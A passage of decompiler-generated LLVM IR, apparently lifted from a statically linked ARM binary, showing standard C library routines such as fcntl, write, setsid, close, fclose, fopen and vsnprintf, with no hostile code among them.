  %v0_12a74 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12a74, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12a74, -4095
  br i1 %tmp, label %dec_label_pc_12a94, label %dec_label_pc_12a84

dec_label_pc_12a84:                               ; preds = %entry
  %v0_12a84 = call i32 @__GI___errno_location()
  %v0_12a88 = load i32, i32* %r7.global-to-local, align 4
  %v1_12a88 = sub i32 0, %v0_12a88
  %v2_12a8c = inttoptr i32 %v0_12a84 to i32*
  store i32 %v1_12a88, i32* %v2_12a8c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12a94.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12a94

dec_label_pc_12a94:                               ; preds = %entry, %dec_label_pc_12a84
  %v1_12a98 = phi i32 [ %v0_12a74, %entry ], [ -1, %dec_label_pc_12a84 ]
  %v2_12a94 = phi i32 [ %v3_12a68, %entry ], [ %v2_12a94.pre, %dec_label_pc_12a84 ]
  store i32 %v2_12a94, i32* @r7, align 4
  ret i32 %v1_12a98

; uselistorder directives
  uselistorder i32 %v0_12a74, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12a94, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_12ad8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12ad8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12ad8, -4095
  br i1 %tmp, label %dec_label_pc_12af8, label %dec_label_pc_12ae8

dec_label_pc_12ae8:                               ; preds = %entry
  %v0_12ae8 = call i32 @__GI___errno_location()
  %v0_12aec = load i32, i32* %r7.global-to-local, align 4
  %v1_12aec = sub i32 0, %v0_12aec
  %v2_12af0 = inttoptr i32 %v0_12ae8 to i32*
  store i32 %v1_12aec, i32* %v2_12af0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12af8

dec_label_pc_12af8:                               ; preds = %entry, %dec_label_pc_12ae8
  %v1_12b04 = phi i32 [ %v0_12ad8, %entry ], [ -1, %dec_label_pc_12ae8 ]
  ret i32 %v1_12b04

; uselistorder directives
  uselistorder i32 %v0_12ad8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12af8, { 1, 0 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_12b44 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12b44, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12b44, -4095
  br i1 %tmp, label %dec_label_pc_12b64, label %dec_label_pc_12b54

dec_label_pc_12b54:                               ; preds = %entry
  %v0_12b54 = call i32 @__GI___errno_location()
  %v0_12b58 = load i32, i32* %r7.global-to-local, align 4
  %v1_12b58 = sub i32 0, %v0_12b58
  %v2_12b5c = inttoptr i32 %v0_12b54 to i32*
  store i32 %v1_12b58, i32* %v2_12b5c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12b64

dec_label_pc_12b64:                               ; preds = %entry, %dec_label_pc_12b54
  %v1_12b70 = phi i32 [ %v0_12b44, %entry ], [ -1, %dec_label_pc_12b54 ]
  ret i32 %v1_12b70

; uselistorder directives
  uselistorder i32 %v0_12b44, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12b64, { 1, 0 }
}

define i32 @__GI_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12b74 = load i32, i32* @r7, align 4
  store i32 %v3_12b74, i32* %stack_var_-8, align 4
  %v0_12b80 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12b80, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12b80, -4095
  br i1 %tmp, label %dec_label_pc_12ba0, label %dec_label_pc_12b90

dec_label_pc_12b90:                               ; preds = %entry
  %v0_12b90 = call i32 @__GI___errno_location()
  %v0_12b94 = load i32, i32* %r7.global-to-local, align 4
  %v1_12b94 = sub i32 0, %v0_12b94
  %v2_12b98 = inttoptr i32 %v0_12b90 to i32*
  store i32 %v1_12b94, i32* %v2_12b98, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12ba0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12ba0

dec_label_pc_12ba0:                               ; preds = %entry, %dec_label_pc_12b90
  %v1_12ba4 = phi i32 [ %v0_12b80, %entry ], [ -1, %dec_label_pc_12b90 ]
  %v2_12ba0 = phi i32 [ %v3_12b74, %entry ], [ %v2_12ba0.pre, %dec_label_pc_12b90 ]
  store i32 %v2_12ba0, i32* @r7, align 4
  ret i32 %v1_12ba4

; uselistorder directives
  uselistorder i32 %v0_12b80, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12ba0, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ba8 = load i32, i32* @r7, align 4
  store i32 %v3_12ba8, i32* %stack_var_-8, align 4
  %v0_12bb4 = load i32, i32* @r0, align 4
  store i32 %v0_12bb4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12bb4, -4095
  br i1 %tmp, label %dec_label_pc_12bd4, label %dec_label_pc_12bc4

dec_label_pc_12bc4:                               ; preds = %entry
  %v0_12bc4 = call i32 @__GI___errno_location()
  %v0_12bc8 = load i32, i32* %r7.global-to-local, align 4
  %v1_12bc8 = sub i32 0, %v0_12bc8
  %v2_12bcc = inttoptr i32 %v0_12bc4 to i32*
  store i32 %v1_12bc8, i32* %v2_12bcc, align 4
  %v2_12bd4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12bd4

dec_label_pc_12bd4:                               ; preds = %entry, %dec_label_pc_12bc4
  %v1_12bd8 = phi i32 [ %v0_12bb4, %entry ], [ -1, %dec_label_pc_12bc4 ]
  %v2_12bd4 = phi i32 [ %v3_12ba8, %entry ], [ %v2_12bd4.pre, %dec_label_pc_12bc4 ]
  store i32 %v2_12bd4, i32* @r7, align 4
  ret i32 %v1_12bd8

; uselistorder directives
  uselistorder i32 %v0_12bb4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12bd4, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_12bdc = load i32, i32* @r3, align 4
  store i32 %v9_12bdc, i32* %stack_var_-4, align 4
  %v2_12be8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12be8, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12c1c, label %dec_label_pc_12c0c

dec_label_pc_12c0c:                               ; preds = %entry
  %v0_12c0c = call i32 @__GI___errno_location()
  %v0_12c10 = load i32, i32* %r7.global-to-local, align 4
  %v1_12c10 = sub i32 0, %v0_12c10
  store i32 %v1_12c10, i32* @r3, align 4
  %v2_12c14 = inttoptr i32 %v0_12c0c to i32*
  store i32 %v1_12c10, i32* %v2_12c14, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12c1c

dec_label_pc_12c1c:                               ; preds = %entry, %dec_label_pc_12c0c
  %v0_12c1c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12c0c ]
  ret i32 %v0_12c1c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12c1c, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12c34.outer

dec_label_pc_12c34.outer:                         ; preds = %dec_label_pc_12c4c, %entry
  %v0_12c34.ph = phi i32 [ %v0_12c34.pre.pre, %dec_label_pc_12c4c ], [ %arg1, %entry ]
  %tmp = icmp ult i32 %v0_12c34.ph, -4095
  br label %dec_label_pc_12c34

dec_label_pc_12c34:                               ; preds = %dec_label_pc_12c34.outer, %dec_label_pc_12c34
  br i1 %tmp, label %dec_label_pc_12c34, label %dec_label_pc_12c4c

dec_label_pc_12c4c:                               ; preds = %dec_label_pc_12c34
  %v0_12c4c = call i32 @__GI___errno_location()
  %v1_12c50 = sub i32 0, %v0_12c34.ph
  %v2_12c54 = inttoptr i32 %v0_12c4c to i32*
  store i32 %v1_12c50, i32* %v2_12c54, align 4
  %v0_12c34.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12c34.outer

; uselistorder directives
  uselistorder i32 %v0_12c34.ph, { 1, 0 }
  uselistorder label %dec_label_pc_12c34, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c5c = load i32, i32* @r7, align 4
  store i32 %v3_12c5c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12c88, label %dec_label_pc_12c78

dec_label_pc_12c78:                               ; preds = %entry
  %v0_12c78 = call i32 @__GI___errno_location()
  %v0_12c7c = load i32, i32* %r7.global-to-local, align 4
  %v1_12c7c = sub i32 0, %v0_12c7c
  %v2_12c80 = inttoptr i32 %v0_12c78 to i32*
  store i32 %v1_12c7c, i32* %v2_12c80, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12c8c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12c88

dec_label_pc_12c88:                               ; preds = %entry, %dec_label_pc_12c78
  %v2_12c8c = phi i32 [ %v3_12c5c, %entry ], [ %v2_12c8c.pre, %dec_label_pc_12c78 ]
  %v0_12c88 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12c78 ]
  store i32 %v2_12c8c, i32* @r7, align 4
  ret i32 %v0_12c88

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12c88, { 1, 0 }
}

define i32 @__GI_close(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c94 = load i32, i32* @r7, align 4
  store i32 %v3_12c94, i32* %stack_var_-8, align 4
  %v0_12ca0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12ca0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12ca0, -4095
  br i1 %tmp, label %dec_label_pc_12cc0, label %dec_label_pc_12cb0

dec_label_pc_12cb0:                               ; preds = %entry
  %v0_12cb0 = call i32 @__GI___errno_location()
  %v0_12cb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_12cb4 = sub i32 0, %v0_12cb4
  %v2_12cb8 = inttoptr i32 %v0_12cb0 to i32*
  store i32 %v1_12cb4, i32* %v2_12cb8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12cc0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12cc0

dec_label_pc_12cc0:                               ; preds = %entry, %dec_label_pc_12cb0
  %v1_12cc4 = phi i32 [ %v0_12ca0, %entry ], [ -1, %dec_label_pc_12cb0 ]
  %v2_12cc0 = phi i32 [ %v3_12c94, %entry ], [ %v2_12cc0.pre, %dec_label_pc_12cb0 ]
  store i32 %v2_12cc0, i32* @r7, align 4
  ret i32 %v1_12cc4

; uselistorder directives
  uselistorder i32 %v0_12ca0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12cc0, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v4_12cd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 684) to i32*), align 4
  %v2_12cd8 = mul i32 %arg1, 2
  %v2_12cdc = add i32 %v4_12cd4, %v2_12cd8
  %v3_12cdc = inttoptr i32 %v2_12cdc to i16*
  %v4_12cdc = load i16, i16* %v3_12cdc, align 2
  %v6_12cdc = zext i16 %v4_12cdc to i32
  %v1_12ce0 = and i32 %v6_12cdc, 32
  ret i32 %v1_12ce0
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_12cf4 = add i32 %arg1, 128
  %v2_12cf8 = icmp ugt i32 %v1_12cf4, 383
  %v0_12d00 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12cf8, i32 %v0_12d00)
  %v4_12d08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 692) to i32*), align 4
  %v2_12d0c = mul i32 %arg1, 2
  %v2_12d10 = add i32 %v4_12d08, %v2_12d0c
  %v3_12d10 = inttoptr i32 %v2_12d10 to i16*
  %v4_12d10 = load i16, i16* %v3_12d10, align 2
  %v6_12d10 = sext i16 %v4_12d10 to i32
  ret i32 %v6_12d10
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r3, align 4
  ret i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 26452)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_12d3c = load i32, i32* @r4, align 4
  store i32 %v3_12d3c, i32* %stack_var_-36, align 4
  %v6_12d3c = load i32, i32* @r5, align 4
  %v9_12d3c = load i32, i32* @r6, align 4
  %v12_12d3c = load i32, i32* @r7, align 4
  %v15_12d3c = load i32, i32* @r8, align 4
  %v27_12d3c = load i32, i32* @lr, align 4
  %v2_12d40 = add i32 %tmp, 52
  %v3_12d40 = inttoptr i32 %v2_12d40 to i32*
  %v4_12d40 = load i32, i32* %v3_12d40, align 4
  %v1_12d48 = sub i32 1, %v4_12d40
  %v2_12d48 = icmp ult i32 %v4_12d40, 2
  br i1 %v2_12d48, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_12d48, %entry ]
  %v0_12d50 = phi i32 [ 0, %bb ], [ %v1_12d48, %entry ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_12d50 = icmp eq i32 %v0_12d50, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r6, align 4
  br i1 %v2_12d50, label %dec_label_pc_12d9c, label %dec_label_pc_12d64

dec_label_pc_12d64:                               ; preds = %thread-pre-split
  %v4_12d7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12d7c)
  %v0_12d90 = load i32, i32* @r6, align 4
  %v2_12d90 = add i32 %v0_12d90, 16
  %v3_12d90 = inttoptr i32 %v2_12d90 to i32*
  %v4_12d90 = load i32, i32* %v3_12d90, align 4
  call void @__pseudo_branch(i32 %v4_12d90)
  %v0_12d9c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12d9c

dec_label_pc_12d9c:                               ; preds = %thread-pre-split, %dec_label_pc_12d64
  %v1_12da4 = phi i32 [ %tmp, %thread-pre-split ], [ %v0_12d9c.pre, %dec_label_pc_12d64 ]
  %v1_12d9c = inttoptr i32 %v1_12da4 to i16*
  %v2_12d9c = load i16, i16* %v1_12d9c, align 2
  %v3_12d9c = zext i16 %v2_12d9c to i32
  %v1_12da0 = and i32 %v3_12d9c, 64
  %v2_12da0 = icmp eq i32 %v1_12da0, 0
  br i1 %v2_12da0, label %bb18, label %bb17

bb17:                                             ; preds = %dec_label_pc_12d9c
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_12d9c, %bb17
  %storemerge24 = phi i32 [ %v1_12da4, %bb17 ], [ %v1_12da0, %dec_label_pc_12d9c ]
  %v1_12da8 = xor i1 %v2_12da0, true
  call void @__pseudo_cond_branch(i1 %v1_12da8, i32 ptrtoint (i32* @global_var_14854.823 to i32))
  store i32 %storemerge24, i32* %sl.global-to-local, align 4
  %v0_12db0 = load i32, i32* @r5, align 4
  %v1_12db0 = add i32 %v0_12db0, 4
  %v2_12db0 = inttoptr i32 %v1_12db0 to i32*
  %v3_12db0 = load i32, i32* %v2_12db0, align 4
  %v1_12db4 = call i32 @__GI_close(i32 %v3_12db0)
  %v0_12dbc = load i32, i32* @r6, align 4
  %v2_12dc8 = add i32 %v0_12dbc, 112
  %v3_12dc8 = inttoptr i32 %v2_12dc8 to i32*
  %v4_12dc8 = load i32, i32* %v3_12dc8, align 4
  store i32 %v4_12dc8, i32* @r7, align 4
  %v1_12dd0 = load i32, i32* @r5, align 4
  %v2_12dd0 = add i32 %v1_12dd0, 4
  %v3_12dd0 = inttoptr i32 %v2_12dd0 to i32*
  store i32 -1, i32* %v3_12dd0, align 4
  %v0_12dd8 = load i32, i32* @r6, align 4
  %v2_12dd8 = add i32 %v0_12dd8, 76
  %v3_12dd8 = inttoptr i32 %v2_12dd8 to i32*
  %v4_12dd8 = load i32, i32* %v3_12dd8, align 4
  %v1_12de0 = icmp slt i32 %v1_12db4, 0
  store i32 %v4_12dd8, i32* %stack_var_-80, align 4
  br i1 %v1_12de0, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  call void @__pseudo_branch(i32 %v4_12dd8)
  %v0_12e08 = load i32, i32* @r6, align 4
  %v2_12e08 = add i32 %v0_12e08, 16
  %v3_12e08 = inttoptr i32 %v2_12e08 to i32*
  %v4_12e08 = load i32, i32* %v3_12e08, align 4
  call void @__pseudo_branch(i32 %v4_12e08)
  %v0_12e18 = load i32, i32* @r6, align 4
  %v2_12e18 = add i32 %v0_12e18, 12
  %v3_12e18 = inttoptr i32 %v2_12e18 to i32*
  %v4_12e18 = load i32, i32* %v3_12e18, align 4
  %v1_12e1c = inttoptr i32 %v4_12e18 to i32*
  %v2_12e1c = load i32, i32* %v1_12e1c, align 4
  %v1_12e24 = add i32 %v2_12e1c, 1
  %v2_12e28 = add i32 %v0_12e18, 24
  %v3_12e28 = inttoptr i32 %v2_12e28 to i32*
  %v4_12e28 = load i32, i32* %v3_12e28, align 4
  store i32 %v4_12e28, i32* @r4, align 4
  store i32 %v1_12e24, i32* %v1_12e1c, align 4
  call void @__pseudo_branch(i32 %v4_12e28)
  %v0_12e40 = load i32, i32* @r5, align 4
  %v1_12e40 = inttoptr i32 %v0_12e40 to i16*
  %v2_12e40 = load i16, i16* %v1_12e40, align 2
  %v1_12e44 = and i16 %v2_12e40, 24576
  %v1_12e48 = or i16 %v1_12e44, 48
  %v0_12e4c = load i32, i32* %sb.global-to-local, align 4
  %v2_12e4c = icmp eq i32 %v0_12e4c, 0
  store i16 %v1_12e48, i16* %v1_12e40, align 2
  br i1 %v2_12e4c, label %.thread, label %bb21

bb21:                                             ; preds = %bb20
  br label %.thread

.thread:                                          ; preds = %bb20, %bb21
  %v2_12e60 = xor i1 %v2_12e4c, true
  call void @__pseudo_cond_branch(i1 %v2_12e60, i32 %v4_12e28)
  %v0_12e64 = load i32, i32* @r5, align 4
  %v1_12e64 = inttoptr i32 %v0_12e64 to i16*
  %v2_12e64 = load i16, i16* %v1_12e64, align 2
  %v1_12e68 = and i16 %v2_12e64, 16384
  %v2_12e68 = icmp eq i16 %v1_12e68, 0
  br i1 %v2_12e68, label %bb23, label %bb22

bb22:                                             ; preds = %.thread
  br label %bb23

bb23:                                             ; preds = %.thread, %bb22
  %v1_12e70 = xor i1 %v2_12e68, true
  call void @__pseudo_cond_branch(i1 %v1_12e70, i32 ptrtoint (i32* @global_var_168b4.827 to i32))
  %v2_12e7c = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_12e7c)
  call void @__pseudo_branch(i32 %v4_12e08)
  %v0_12e9c = load i32, i32* @r6, align 4
  %v2_12e9c = add i32 %v0_12e9c, 52
  %v3_12e9c = inttoptr i32 %v2_12e9c to i32*
  %v4_12e9c = load i32, i32* %v3_12e9c, align 4
  %v1_12ea0 = inttoptr i32 %v4_12e9c to i32*
  %v2_12ea0 = load i32, i32* %v1_12ea0, align 4
  %v1_12ea4 = add i32 %v2_12ea0, 1
  store i32 %v1_12ea4, i32* %v1_12ea0, align 4
  call void @__pseudo_branch(i32 %v4_12e28)
  %v0_12ebc = call i32 @_stdio_openlist_dec_use()
  %v0_12ec0 = load i32, i32* %sl.global-to-local, align 4
  %v2_12ec8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_12ec8, i32* @r4, align 4
  store i32 %v6_12d3c, i32* @r5, align 4
  store i32 %v9_12d3c, i32* @r6, align 4
  store i32 %v12_12d3c, i32* @r7, align 4
  store i32 %v15_12d3c, i32* @r8, align 4
  store i32 %v27_12d3c, i32* @lr, align 4
  ret i32 %v0_12ec0

; uselistorder directives
  uselistorder i1 %v2_12e68, { 1, 0 }
  uselistorder i32 %v4_12e28, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12d48, { 1, 0 }
  uselistorder i32 %v4_12d40, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_12d9c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_12ed4(i32 %arg1) local_unnamed_addr {
dec_label_pc_12ed4:
  %v0_12ed4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12ed4, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_12ed4
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_12ed4, %bb
  %v10_12eec = phi i32 [ %arg1, %dec_label_pc_12ed4 ], [ 0, %bb ]
  ret i32 %v10_12eec

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_12f00 = call i32 @_stdio_fopen()
  ret i32 %v0_12f00
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_12f1c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_12f1c, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_12f30 = call i32 @__GI_vsnprintf()
  ret i32 %v0_12f30

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v3_12f44 = load i32, i32* @r4, align 4
  %v6_12f44 = load i32, i32* @r5, align 4
  %v9_12f44 = load i32, i32* @r6, align 4
  %v12_12f44 = load i32, i32* @r7, align 4
  %v18_12f44 = load i32, i32* @sl, align 4
  %v2_12f4c = ptrtoint i32* %stack_var_-112 to i32
  %v0_12f50 = load i32, i32* @r0, align 4
  store i32 %v0_12f50, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v2_12f58 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12f58, i32* @r0, align 4
  %v0_12f60 = load i32, i32* @r3, align 4
  store i32 %v0_12f60, i32* @r7, align 4
  store i32 1, i32* @ip, align 4
  %v0_12f6c = load i32, i32* @r1, align 4
  store i32 %v0_12f6c, i32* @r5, align 4
  %v0_12f70 = load i32, i32* @r2, align 4
  store i32 %v0_12f70, i32* @r6, align 4
  store i32 208, i32* %stack_var_-112, align 4
  %v1_12f84 = call i32 @__stdio_init_mutex(i32 %v2_12f58)
  %v0_12f88 = load i32, i32* @r4, align 4
  %v1_12f88 = sub i32 -1, %v0_12f88
  %v0_12f8c = load i32, i32* @r5, align 4
  %v3_12f8c = icmp ult i32 %v0_12f8c, %v1_12f88
  br i1 %v3_12f8c, label %bb26, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_12f88, i32* @r5, align 4
  br label %bb26

bb26:                                             ; preds = %entry, %bb
  %v1_12f94 = phi i32 [ %v0_12f8c, %entry ], [ %v1_12f88, %bb ]
  %v2_12f94 = add i32 %v1_12f94, %v0_12f88
  %v0_12f9c = load i32, i32* @r6, align 4
  %v0_12fa0 = load i32, i32* @r7, align 4
  %v0_12fac = load i32, i32* @sl, align 4
  %v5_12fb8 = inttoptr i32 %v0_12f88 to i8*
  %v15_12fc0 = inttoptr i32 %v0_12f9c to i8*
  %v16_12fc0 = call i32 @_vfprintf_internal(i32 %v2_12f4c, i8* %v15_12fc0, i32 %v0_12fa0, i32 %v2_12f94, i32 %v0_12f88, i32 %v2_12f94, i32 %v0_12f88, i32 %v0_12f88, i32 %v0_12f88, i32 %v2_12f94, i32 %v0_12fac)
  %v0_12fc4 = load i32, i32* @r5, align 4
  %v1_12fc4 = load i32, i32* @sl, align 4
  %v9_12fc4 = icmp eq i32 %v0_12fc4, %v1_12fc4
  br i1 %v9_12fc4, label %dec_label_pc_12fec, label %dec_label_pc_12fd0

dec_label_pc_12fd0:                               ; preds = %bb26
  %v3_12f94 = inttoptr i32 %v2_12f94 to i8*
  %v9_12fd8 = icmp eq i8* %v5_12fb8, %v3_12f94
  br i1 %v9_12fd8, label %bb27, label %bb28

bb27:                                             ; preds = %dec_label_pc_12fd0
  %v2_12fdc = add i32 %v0_12f88, -1
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_12fd0, %bb27
  %v1_12fe0 = phi i32 [ %v2_12f94, %dec_label_pc_12fd0 ], [ %v2_12fdc, %bb27 ]
  %v6_12fe0 = inttoptr i32 %v1_12fe0 to i8*
  %stack_var_-96.0 = select i1 %v9_12fd8, i8* %v6_12fe0, i8* %v5_12fb8
  %v1_12fe8 = trunc i32 %v1_12fc4 to i8
  store i8 %v1_12fe8, i8* %stack_var_-96.0, align 1
  br label %dec_label_pc_12fec

dec_label_pc_12fec:                               ; preds = %bb26, %bb28
  store i32 %v3_12f44, i32* @r4, align 4
  store i32 %v6_12f44, i32* @r5, align 4
  store i32 %v9_12f44, i32* @r6, align 4
  store i32 %v12_12f44, i32* @r7, align 4
  store i32 %v18_12f44, i32* @sl, align 4
  ret i32 %v16_12fc0

; uselistorder directives
  uselistorder i32 %v2_12f94, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_12f88, { 2, 1, 0 }
  uselistorder i32 %v0_12f88, { 2, 4, 5, 7, 3, 6, 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_12fec, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_12ff8 = load i32, i32* @r4, align 4
  store i32 %v3_12ff8, i32* %stack_var_-36, align 4
  %v6_12ff8 = load i32, i32* @r5, align 4
  %v9_12ff8 = load i32, i32* @r6, align 4
  %v18_12ff8 = load i32, i32* @sb, align 4
  %v24_12ff8 = load i32, i32* @fp, align 4
  %v0_12ffc = load i32, i32* @r1, align 4
  %v1_12ffc = inttoptr i32 %v0_12ffc to i8*
  %v2_12ffc = load i8, i8* %v1_12ffc, align 1
  %v3_12ffc = zext i8 %v2_12ffc to i32
  store i32 %v3_12ffc, i32* @ip, align 4
  %v7_13004 = icmp eq i8 %v2_12ffc, 114
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @fp, align 4
  %v2_1300c = ptrtoint i32* %stack_var_-72 to i32
  %v0_13010 = load i32, i32* @r0, align 4
